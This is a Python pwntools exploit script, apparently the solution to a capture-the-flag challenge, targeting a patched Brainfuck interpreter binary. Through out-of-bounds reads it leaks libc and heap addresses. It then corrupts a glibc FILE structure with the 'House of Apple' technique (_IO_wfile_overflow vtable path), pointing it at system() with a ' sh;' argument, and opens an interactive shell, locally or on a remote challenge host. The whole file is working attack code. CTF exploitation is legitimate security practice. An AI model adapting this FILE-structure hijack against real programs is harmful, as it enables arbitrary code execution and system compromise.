import os
from pwn import *

elf = context.binary = ELF('./cbi_patched')
directory = os.path.dirname(elf.path)
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

gdb_script =""" 
continue
"""
#scanf break *0x401938
#p break *0x401b4
#g break *0x4019e0

def start():
    if args.GDB:
        return gdb.debug([elf.path,directory + "/calc.bf"], gdbscript=gdb_script)
    if args.REMOTE:
        return remote("challs2.pyjail.club",7479)
    else:
        return process([elf.path,directory + "/calc.bf"])

def do_opcode(arg1,arg2,opcode):
    p.recvuntil("1+1:")
    p.sendline(str(arg1) + opcode+str(arg2))

def modify_filestruct(data, offset):
    for i in range(8):
        bytedata = u8(data[i:i+1])
        do_opcode(3,bytedata,"&")
        p.sendline("1337")
        do_opcode(-4912+(offset+i),-76,"p")

p = start()

libc_leak = b""
#leak _nl_C_name's address
for i in range(8):
    do_opcode(-0xA0+i,-709,"g")
    aa = p.recvuntil("\n").strip()
    aa = int(aa.decode())
    libc_leak += struct.pack('b', aa)

libc_leak = u64(libc_leak)
libc_leak -= 0x1CCA38
libc.address = libc_leak
print("LIBC : " + hex(libc.address))

#heap leak

heap_leak = b""
for i in range(8):
    do_opcode(-0x18+i, -25, "g")
    aa = p.recvuntil("\n").strip()
    aa = int(aa.decode())
    heap_leak += struct.pack('b', aa)

heap_leak = u64(heap_leak)
heap_leak = heap_leak - 0x1670
print("HEAP : " + hex(heap_leak))

#House of Apple - IO_wfile_overflow path

wfile_overflow_addr = libc.address+ 0x202228 + 0x18
modify_filestruct(b'\x20\x20\x20\x73\x68\x3b\x00\x00',0)
modify_filestruct(p64(0x0),8)
modify_filestruct(p64(0x0),32)
modify_filestruct(p64(heap_leak+(0x2d0-16)),160)
modify_filestruct(p64(libc.symbols["system"]),200)
modify_filestruct(p64(heap_leak+0x2d0+0x60),208)
modify_filestruct(p64(wfile_overflow_addr-0x88),0xD8) #modify the vtable so close() in IO_new_file_close_it calls _IO_wfile_overflow
p.sendlineafter("1+1: ","qqq")
p.interactive()